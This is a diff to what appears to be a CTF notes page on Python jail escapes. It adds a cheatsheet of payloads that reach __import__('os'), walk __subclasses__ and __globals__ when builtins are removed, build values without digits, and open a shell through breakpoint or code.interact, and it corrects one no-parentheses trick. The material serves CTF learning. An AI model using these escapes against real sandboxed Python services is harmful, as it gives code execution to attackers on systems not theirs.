@@ -11,6 +11,49 @@ Table of contents:
 * TOC
 {:toc}
 
+## cheatsheet
+
+### Assign to variables
+
+- `a=1` in exec
+- `[a:=1]` in eval
+- `[a for a in [1]]`
+- `[[a]for[a]in[[1]]]`
+
+### Call functions
+
+- `__import__('os')`: `help.__class__.__getitem__ = __import__;help['os']` for object, `ExceptionGroup.__class_getitem__ = __import__;ExceptionGroup["os"]` for class
+- `breakpoint()`: `license._Printer__setup = breakpoint; str(license)`
+- `exec(input())`: `@exec\n@input\nclass a: pass`
+
+### Construct strings
+
+- `__import__('os')`: `help.__class__.__getattr__ = __import__;help.os`
+- `help.__doc__[index]`
+
+### No builtins
+
+- `().__class__.__base__.__subclasses__()`
+- `().__setattr__.__objclass__.__subclasses__()`
+- `().__reduce_ex__(2)[0].__globals__`
+- `().__class__.__mro__[1].__subclasses__()`
+
+### No numbers/booleans
+
+- `True`
+- `[]>[]` is `False`
+- `[[]]>[]` is `True`
+- `[]is[]` is `False`
+- `not[]is[]` is `True`
+- `-~x` is `x+1`
+
+### Get shell
+
+- `breakpoint`
+- `pdb.set_trace()`
+- `code.interact()`
+- `code.InteractiveConsole().interact()`
+
 ## jailCTF 2025 impossible
 
 Requirements:
@@ -198,7 +241,7 @@ Details [here](./pyjail/tbtl-ctf-2024-squeezing-tightly-on-arm.md).
 Requirements:
 
 1. No numbers: Use `arr[[]is[]]` for `arr[0]`, `arr[not[]is[]]` for `arr[1]`, `arr[not[]is[]:][not[]is[]]` for `arr[2]`
-2. No parens: Use `[obj[arg] for obj.__class_getitem in [function_to_call]]` to call function
+2. No parens: Use `[class[arg] for class.__class_getitem__ in [function_to_call]]` to call function
 3. No assignments or commas: Use `[... for a in [b] for c in [d]]`
 4. No spaces: Use `\f` i.e. form feed
 5. No builtins: Use `[].__class__.__base__.__subclasses__()`
